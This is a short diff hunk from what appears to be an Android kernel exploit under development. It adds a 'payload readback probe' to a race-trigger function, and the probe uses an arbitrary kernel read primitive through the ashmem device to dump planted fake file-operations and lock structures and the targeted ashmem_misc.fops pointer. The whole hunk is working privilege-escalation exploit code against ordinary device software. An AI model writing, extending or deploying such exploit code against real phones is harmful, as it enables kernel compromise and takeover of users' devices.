@@ -2199,6 +2199,44 @@ static int slide_child_trigger_write(void) {
   while (!atomic_load(&slide_route_done)) {
     usleep(1000);
   }
+
+  /* v41-payload-readback-probe */
+  {
+    extern int open_ashmem_device(void);
+    extern ssize_t kernel_read_data(int fd, uintptr_t addr, void *buf,
+                                    size_t len);
+    int vfd = open_ashmem_device();
+    if (vfd >= 0) {
+      uint64_t vp[8];
+      ssize_t r;
+
+      r = kernel_read_data(vfd, fake_fops, vp, sizeof(vp));
+      pr_info("payload fake_fops ret=%zd  "
+              "%016llx %016llx %016llx %016llx "
+              "%016llx %016llx %016llx %016llx\n",
+              r,
+              (unsigned long long)vp[0], (unsigned long long)vp[1],
+              (unsigned long long)vp[2], (unsigned long long)vp[3],
+              (unsigned long long)vp[4], (unsigned long long)vp[5],
+              (unsigned long long)vp[6], (unsigned long long)vp[7]);
+
+      r = kernel_read_data(vfd, fake_lock, vp, sizeof(vp));
+      pr_info("payload fake_lock ret=%zd  "
+              "%016llx %016llx %016llx %016llx "
+              "%016llx %016llx %016llx %016llx\n",
+              r,
+              (unsigned long long)vp[0], (unsigned long long)vp[1],
+              (unsigned long long)vp[2], (unsigned long long)vp[3],
+              (unsigned long long)vp[4], (unsigned long long)vp[5],
+              (unsigned long long)vp[6], (unsigned long long)vp[7]);
+
+      r = kernel_read_data(vfd, slide_oracle_target, vp, 16);
+      pr_info("payload target ashmem_misc.fops ret=%zd  %016llx %016llx\n",
+              r, (unsigned long long)vp[0], (unsigned long long)vp[1]);
+
+      close(vfd);
+    }
+  }
 #if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
 #if defined(APP_S928_ROUTE_DIAG) && APP_S928_ROUTE_DIAG
   int waiter_ok = atomic_load(&slide_waiter_ok);
